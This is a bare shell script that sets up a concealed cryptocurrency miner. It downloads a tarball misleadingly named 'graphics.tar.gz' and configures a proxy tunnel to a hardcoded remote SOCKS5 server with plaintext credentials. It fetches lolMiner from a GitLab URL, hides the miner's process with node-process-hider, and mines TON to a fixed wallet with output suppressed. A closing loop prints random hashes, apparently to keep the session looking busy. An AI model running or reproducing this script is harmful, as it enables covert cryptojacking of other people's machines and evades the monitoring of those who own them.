apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.216.28.28:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
chmod +x lolMiner

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(echo $(shuf -i 1-20000 -n 1)-V) >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
